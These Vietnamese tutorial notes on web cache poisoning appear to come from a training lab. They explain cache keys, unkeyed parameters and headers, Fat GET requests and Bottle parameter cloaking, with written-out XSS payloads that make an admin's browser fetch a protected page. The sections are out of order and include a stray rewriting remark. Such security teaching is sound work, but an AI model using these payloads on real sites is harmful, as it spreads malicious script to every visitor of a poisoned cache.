
---

# 1. Kỹ Thuật Tiến Tiến Trong Tấn Công Web Cache Poisoning

Trong phần trước, chúng ta đã thảo luận về các kỹ thuật cơ bản để phát hiện và khai thác lỗ hổng web cache poisoning. Trong phần này, chúng ta sẽ tìm hiểu hai kỹ thuật tiên tiến khai thác các lỗi cấu hình của máy chủ web, biến các cấu hình tưởng chừng an toàn trở nên dễ bị tổn thương.

---

### **1. Fat GET**

#### **Khái niệm**
- **Fat GET** là các yêu cầu HTTP GET có chứa **request body** (phần nội dung trong yêu cầu).
- Theo tiêu chuẩn, GET parameters được truyền qua query string (phần sau dấu `?` trong URL). Việc gửi thêm **request body** trong GET là không cần thiết và không có ý nghĩa.
- Tuy nhiên, một số máy chủ bị cấu hình sai có thể xử lý các tham số trong **request body**, dẫn đến việc khai thác lỗ hổng **web cache poisoning**.

#### **Ví dụ minh họa**
- Xem xét ứng dụng web với URL sau:  
  ```http
  GET /index.php?language=en HTTP/1.1
  Host: fatget.wcp.htb
  ```
  **language** được đặt là `en` (tiếng Anh). Tuy nhiên, nếu ta gửi yêu cầu như sau:  
  ```http
  GET /index.php?language=en HTTP/1.1
  Host: fatget.wcp.htb
  Content-Length: 11
  language=de
  ```
  **language** trong **request body** là `de` (tiếng Đức). Nếu máy chủ ưu tiên giá trị trong **request body**, kết quả sẽ trả về trang bằng tiếng Đức.

#### **Tấn công Fat GET**
1. Xác nhận lỗ hổng:  
   - Gửi yêu cầu với **request body** và kiểm tra xem máy chủ xử lý tham số nào.
2. Poison cache:
   - Sử dụng **Fat GET** để gửi payload độc hại vào cache:
     ```http
     GET /index.php?language=de HTTP/1.1
     Host: fatget.wcp.htb
     Content-Length: 142
     ref="><script>var xhr = new XMLHttpRequest();xhr.open('GET', '/admin.php?reveal_flag=1', true);xhr.withCredentials = true;xhr.send();</script>
     ```
   - Khi admin truy cập, payload XSS sẽ được thực thi và tiết lộ thông tin nhạy cảm.

---

### **2. Parameter Cloaking**

#### **Khái niệm**
- Kỹ thuật này khai thác sự khác biệt trong cách máy chủ và bộ nhớ cache xử lý các tham số URL.
- Nếu bộ nhớ cache và máy chủ không đồng bộ trong việc nhận diện tham số URL, có thể tạo ra lỗ hổng.

#### **Ví dụ minh họa**
- Với framework Python Bottle (CVE-2020-28473), tham số URL có thể sử dụng dấu chấm phẩy `;` để phân tách:  
  ```http
  GET /?a=1;b=2
  ```
  - Bottle thấy:  
    - `a = 1`, `b = 2`
  - Bộ nhớ cache thấy:  
    - `a = 1;b=2`

#### **Tấn công Parameter Cloaking**
1. Tạo sự khác biệt giữa máy chủ và cache:
   ```http
   GET /?language=en&a=b;language=de HTTP/1.1
   Host: cloak.wcp.htb
   ```
   - Máy chủ xử lý `language=de` (tiếng Đức), trong khi bộ nhớ cache lưu `language=en`.

2. Poison cache:
   - Gửi payload độc hại với tham số được che giấu:
     ```http
     GET /?language=de&a=b;ref=%22%3E%3Cscript%3Evar%20xhr=new%20XMLHttpRequest();xhr.open('GET','/admin?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();%3C/script%3E HTTP/1.1
     Host: cloak.wcp.htb
     ```
   - Khi admin truy cập, script XSS sẽ được thực thi để lộ flag.

---

### **Lưu ý quan trọng**
- **Fat GET** thường do cấu hình sai của máy chủ web.
- **Parameter Cloaking** cần có sự khác biệt trong cách xử lý tham số giữa cache và máy chủ.

---
Dưới đây là tài liệu đã được viết lại với cách trình bày rõ ràng, dễ hiểu hơn:

---

# 2. Giới Thiệu Về Lỗi Cấu Hình HTTP

HTTP là một trong những giao thức được sử dụng phổ biến nhất trên Internet, hỗ trợ hàng tỷ thiết bị mỗi ngày. Với vai trò quan trọng của các ứng dụng web trong thế giới số, bảo mật web không chỉ dừng lại ở việc xem xét từng ứng dụng riêng lẻ, mà cần đánh giá tổng thể hệ thống, bao gồm cả các thành phần như máy chủ web và bộ nhớ đệm (web caches), những yếu tố làm tăng độ phức tạp và bề mặt tấn công.
---

### **Web Cache và Lỗ Hổng Tiềm Ẩn**
- **Web caches** được sử dụng trong các dịch vụ web để cải thiện hiệu suất bằng cách giảm tải cho máy chủ.  
- Khi một tài nguyên được yêu cầu, bộ nhớ đệm lưu trữ tài nguyên đó để có thể phục vụ các yêu cầu tương tự từ bộ nhớ cục bộ mà không cần yêu cầu lại từ máy chủ.  
- Tuy nhiên, sự phụ thuộc này cũng có thể dẫn đến lỗ hổng bảo mật nếu bộ nhớ đệm được cấu hình sai, tạo cơ hội cho các kiểu tấn công như **Web Cache Poisoning**.

---

### **Host Header và Vai Trò Của Nó**
- **Host header** là một phần bắt buộc trong mọi yêu cầu HTTP từ phiên bản HTTP/1.1, xác định tên miền hoặc cổng của máy chủ mà yêu cầu được gửi đến.  
- Khi một máy chủ phục vụ nhiều ứng dụng web, **host header** được sử dụng để định danh ứng dụng mục tiêu.  
- Nếu ứng dụng xử lý **host header** không đúng cách, có thể xuất hiện lỗ hổng cho phép kẻ tấn công thực hiện các **Host Header Attacks**.

---

### **Session Và Tầm Quan Trọng Của Nó**
- HTTP là giao thức **stateless** (không lưu trạng thái), vì vậy **sessions** được sử dụng để cung cấp ngữ cảnh cho các yêu cầu.  
- Thông qua session ID, ứng dụng web có thể nhận diện người dùng mà không cần xác thực trong mỗi yêu cầu.  
- Nếu session variables (biến phiên) được xử lý không đúng cách, có thể dẫn đến các lỗ hổng như **Session Puzzling**, gây nguy cơ chiếm quyền tài khoản hoặc vượt qua cơ chế xác thực.

---

### **Các Kiểu Tấn Công HTTP**

#### **1. Web Cache Poisoning**
- **Mục tiêu:** Khai thác lỗi cấu hình trong bộ nhớ đệm và các lỗ hổng của ứng dụng web cơ sở để tấn công người dùng không cảnh giác.  
- **Nguy hiểm:**  
  - Tự động khai thác chỉ bằng cách người dùng truy cập trang web mục tiêu.  
  - Biến các lỗ hổng khó khai thác thành vũ khí hiệu quả để tấn công hàng loạt nạn nhân.  

---

#### **2. Host Header Attacks**
- **Mục tiêu:** Tận dụng lỗi trong việc xử lý **host header** để:  
  - Bypass (vượt qua) kiểm tra ủy quyền.  
  - Tạo liên kết độc hại thông qua việc thao túng **host header**.  
- **Cách thức:**  
  - Lợi dụng các ứng dụng sử dụng **host header** để tạo liên kết tuyệt đối hoặc thực hiện kiểm tra bảo mật.  

---

#### **3. Session Puzzling**
- **Mục tiêu:** Khai thác lỗi trong việc xử lý session variables để:  
  - Vượt qua xác thực.  
  - Chiếm quyền điều khiển tài khoản.  
- **Nguyên nhân:**  
  - Tái sử dụng session variables trong các quy trình khác nhau.  
  - Gán giá trị mặc định không an toàn cho session variables.  
  - Quản lý session variables không đúng cách.

---

# 3. Giới Thiệu Về Tấn Công Web Cache Poisoning

**Web cache poisoning** là một phương thức tấn công tiên tiến nhằm ép bộ nhớ đệm web cung cấp nội dung độc hại cho người dùng không ngờ đến khi truy cập vào trang web bị tổn thương.  
- **Mục đích:** Lợi dụng bộ nhớ đệm để phân phối mã độc hoặc gia tăng mức độ nghiêm trọng của lỗ hổng, chẳng hạn như chuyển đổi **reflected XSS** thành một cuộc tấn công diện rộng mà không cần sự tương tác của người dùng.  
- **Ví dụ:** Tấn công có thể xảy ra trên các bộ nhớ đệm phổ biến như **Apache**, **Nginx**, và **Squid**.  

---

### **Nguyên Lý Hoạt Động Của Bộ Nhớ Đệm Web**

#### **Lợi Ích Của Caching**
- Khi một dịch vụ web có lượng người dùng lớn, khả năng mở rộng là rất quan trọng.  
- **Web caches** giúp giảm tải cho máy chủ bằng cách lưu trữ các tài nguyên cục bộ để phục vụ các yêu cầu tương tự trong tương lai mà không cần truy vấn máy chủ gốc.  
- **Cách hoạt động:**  
  - Nếu tài nguyên chưa được lưu, bộ nhớ đệm sẽ yêu cầu máy chủ và sau đó lưu lại để sử dụng cho các yêu cầu tiếp theo.  
  - Tài nguyên được lưu trong một khoảng thời gian giới hạn để đảm bảo các thay đổi trên máy chủ được cập nhật.

---

#### **Cách Bộ Nhớ Đệm Phân Biệt Yêu Cầu**
Bộ nhớ đệm sử dụng một tập hợp con của các thông số yêu cầu HTTP để xác định liệu hai yêu cầu có thể được phục vụ cùng một phản hồi hay không. Tập hợp này gọi là **Cache Key**.  
- **Cấu hình mặc định:**  
  - Bao gồm: **Đường dẫn yêu cầu (request path)**, **tham số GET**, và **Host header**.  
  - Không bao gồm: Các thông số không ảnh hưởng trực tiếp đến phản hồi như **User-Agent** hoặc **Referer**.

---

### **Ví Dụ Về Cache Key**

**Cấu hình mặc định:**
1. Yêu cầu đầu tiên:  
   ```plaintext
   GET /index.html?language=en HTTP/1.1
   Host: example.com
   User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
   ```
2. Yêu cầu thứ hai (khác **User-Agent**, nhưng Cache Key không thay đổi):  
   ```plaintext
   GET /index.html?language=en HTTP/1.1
   Host: example.com
   User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 13_1)
   ```
   → **Kết quả:** Cả hai yêu cầu được phục vụ cùng một phản hồi.  

**Thay đổi Cache Key (thay đổi tham số GET):**
- Yêu cầu với tham số ngôn ngữ khác:  
   ```plaintext
   GET /index.html?language=de HTTP/1.1
   Host: example.com
   ```
   → **Kết quả:** Phản hồi khác do Cache Key thay đổi.

**Phân loại tham số:**
- **Keyed parameters:** Tham số nằm trong Cache Key (ví dụ: **GET parameters**, **Host header**).  
- **Unkeyed parameters:** Tham số không nằm trong Cache Key (ví dụ: **User-Agent**, **Referer**).  

---

### **Cấu Hình Bộ Nhớ Đệm Web Trong Nginx**

**Cấu hình mẫu Nginx:**
```nginx
http {
    proxy_cache_path /cache levels=1:2 keys_zone=STATIC:10m inactive=24h max_size=1g;
    server {
        listen 80;
        location / {
            proxy_pass http://172.17.0.1:80;
            proxy_buffering on;
            proxy_cache STATIC;
            proxy_cache_valid 2m;
            proxy_cache_key $scheme$proxy_host$uri$args;
            add_header X-Cache-Status $upstream_cache_status;
        }
    }
}
```

**Giải thích:**
1. `proxy_cache_path`: Thiết lập đường dẫn lưu trữ bộ nhớ đệm.  
2. `proxy_pass`: Địa chỉ máy chủ gốc.  
3. `proxy_buffering`: Kích hoạt caching.  
4. `proxy_cache_valid`: Thời gian tồn tại của bộ nhớ đệm (ví dụ: 2 phút).  
5. `proxy_cache_key`: Định nghĩa Cache Key (ví dụ: `$uri$args`).  
6. `add_header`: Thêm thông tin trạng thái cache (`X-Cache-Status`) vào phản hồi.

---

### **Cấu Hình Tùy Chỉnh Cache Key**

Ví dụ: Chỉ thêm tham số **language** vào Cache Key:  
```nginx
proxy_cache_key $scheme$proxy_host$uri$arg_language;
```

**Kết quả:**  
- Hai yêu cầu sau sẽ được phục vụ cùng một phản hồi:  
  ```plaintext
  GET /index.html?language=de&timestamp=1
  GET /index.html?language=de&timestamp=2
  ```
- **Lý do:** Tham số **timestamp** không nằm trong Cache Key.

---
# 4. Xác Định Các Tham Số Không Được Đưa Vào Cache Key (Unkeyed Parameters)

Trong tấn công **web cache poisoning**, mục tiêu là buộc bộ nhớ đệm phục vụ nội dung độc hại cho những người dùng khác. Điều này yêu cầu sử dụng **unkeyed parameters** để chèn payload độc hại vào phản hồi được lưu trữ.  
- Nếu tham số là **keyed**, yêu cầu của nạn nhân phải chứa chính payload độc hại đó, giống như trong tấn công **reflected XSS**, hạn chế khả năng tấn công hàng loạt.  

---

### **Ví Dụ: Phân Tích Unkeyed Parameters**

Giả sử một ứng dụng web dễ bị tấn công XSS qua tham số `ref` và hỗ trợ nhiều ngôn ngữ qua tham số `language`.  
- **`language` là keyed**, trong khi **`ref` là unkeyed.**  
- URL độc hại:  
  ```plaintext
  /index.php?language=en&ref="><script>alert(1)</script>
  ```
- Bộ nhớ đệm lưu lại phản hồi chứa mã độc và phục vụ cho tất cả yêu cầu `/index.php?language=en`.  

---

### **Xác Định Unkeyed Parameters**

1. **Nguyên tắc chung:**  
   - Quan sát sự thay đổi trong phản hồi khi thay đổi tham số.  
   - Nếu thay đổi giá trị tham số nhưng phản hồi vẫn giống nhau → tham số đó là **unkeyed.**  

2. **Ví dụ: Thử nghiệm với các tham số GET**
   - **Tham số `language` (keyed):**  
     - Yêu cầu đầu tiên: Cache miss.  
     - Yêu cầu thứ hai (cùng giá trị): Cache hit.  
     - Thay đổi giá trị → Cache miss.  

   - **Tham số `content` (keyed):**  
     - Tương tự như `language`, các giá trị khác nhau dẫn đến cache miss.  

   - **Tham số `ref` (unkeyed):**  
     - Yêu cầu đầu tiên: Cache miss.  
     - Yêu cầu với giá trị khác của `ref`: Cache hit.  

---

### **Thực Hiện Tấn Công**

1. **Xác định XSS qua tham số unkeyed (`ref`):**  
   - URL độc hại:  
     ```plaintext
     /index.php?language=unusedvalue&ref="><script>alert(1)</script>
     ```
   - **Lưu ý:** Dùng giá trị `language` chưa từng sử dụng trước đó để tránh phản hồi được lấy từ cache.  

2. **Kịch bản tấn công:**  
   - Poison cache với payload:  
     ```html
     <script>
       var xhr = new XMLHttpRequest();
       xhr.open('GET', '/admin.php?reveal_flag=1', true);
       xhr.withCredentials = true;
       xhr.send();
     </script>
     ```
   - URL để poison cache:  
     ```plaintext
     GET /index.php?language=de&ref=%22%3E%3Cscript%3Evar%20xhr%20=%20new%20XMLHttpRequest();xhr.open(%27GET%27,%20%27/admin.php?reveal_flag=1%27,%20true);xhr.withCredentials%20=%20true;xhr.send();%3C/script%3E
     ```

3. **Kết quả:**  
   - Khi admin truy cập trang `/index.php?language=de`, payload được kích hoạt, và phản hồi `/admin.php?reveal_flag=1` được gửi đến kẻ tấn công.

---

### **Phân Tích Headers Không Được Đưa Vào Cache Key**

Tương tự với tham số GET, một số HTTP headers cũng có thể là **unkeyed**:  
- **Ví dụ:** Header `X-Backend-Server` (unkeyed).  
  - Header này ảnh hưởng đến vị trí tải script debug.  

**Payload qua header:**
```plaintext
GET /index.php?language=de HTTP/1.1
Host: webcache.htb
X-Backend-Server: testserver.htb"></script><script>var xhr=new XMLHttpRequest();xhr.open('GET','/admin.php?reveal_flag=1',true);xhr.withCredentials=true;xhr.send();</script>
```

**Kết quả:**  
- Header `X-Backend-Server` chứa payload XSS, được lưu trong cache và kích hoạt khi admin truy cập trang.

---

